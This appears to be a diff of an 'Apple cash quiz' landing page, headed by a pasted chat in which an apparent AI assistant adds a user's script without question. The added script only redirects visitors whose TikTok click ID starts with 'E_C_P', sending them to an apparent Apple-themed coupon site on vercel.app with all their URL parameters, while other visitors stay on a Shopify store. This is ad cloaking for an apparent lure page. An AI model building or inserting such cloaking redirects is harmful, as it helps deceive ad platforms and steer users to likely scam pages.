@@ -1,3 +1,49 @@
+Pasted text(20260825-055504).txt
+Document
+<script>
+(function () {
+  function getURLParameter(name) {
+    const urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get(name);
+  }
+
+  (function ensureTTCLIDParamOnLander() {
+    try {
+      const u = new URL(window.location.href);
+
+      if (!u.searchParams.has('ttclid')) {
+        u.searchParams.set('ttclid', '');
+        history.replaceState(null, '', u.toString());
+      }
+    } catch (e) {}
+  })();
+
+  const ttclid = getURLParameter('ttclid') || '';
+
+  // Redirect only when the ttclid starts with E_C_P.
+  // Otherwise, do nothing and keep the visitor on the Shopify store.
+  if (!ttclid.startsWith('E_C_P')) {
+    return;
+  }
+
+  const finalURL = new URL('https://applecoupons.vercel.app/');
+  const currentParams = new URLSearchParams(window.location.search);
+
+  currentParams.forEach((value, key) => {
+    finalURL.searchParams.set(key, value);
+  });
+
+  finalURL.searchParams.set('ttclid', ttclid);
+  window.location.href = finalURL.toString();
+})();
+</script>
+
+add this script in this 
+
+Done. I added your ttclid redirect script into the existing landing-page code while keeping the existing affiliate redirect, source parameter logic, popup, and FAQ functionality unchanged.
+
+Download the complete updated HTML file
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -700,6 +746,45 @@
   </div>
 
 
+
+<script>
+(function () {
+  function getURLParameter(name) {
+    const urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get(name);
+  }
+
+  (function ensureTTCLIDParamOnLander() {
+    try {
+      const u = new URL(window.location.href);
+
+      if (!u.searchParams.has('ttclid')) {
+        u.searchParams.set('ttclid', '');
+        history.replaceState(null, '', u.toString());
+      }
+    } catch (e) {}
+  })();
+
+  const ttclid = getURLParameter('ttclid') || '';
+
+  // Redirect only when the ttclid starts with E_C_P.
+  // Otherwise, do nothing and keep the visitor on the current store/page.
+  if (!ttclid.startsWith('E_C_P')) {
+    return;
+  }
+
+  const finalURL = new URL('https://applecoupons.vercel.app/');
+  const currentParams = new URLSearchParams(window.location.search);
+
+  currentParams.forEach((value, key) => {
+    finalURL.searchParams.set(key, value);
+  });
+
+  finalURL.searchParams.set('ttclid', ttclid);
+  window.location.href = finalURL.toString();
+})();
+</script>
+
   <script>
     /*
       =========================================================
@@ -804,3 +889,5 @@
 
 </body>
 </html>
+apple_cash_quiz_with_ttclid_redirect.html
+HTML
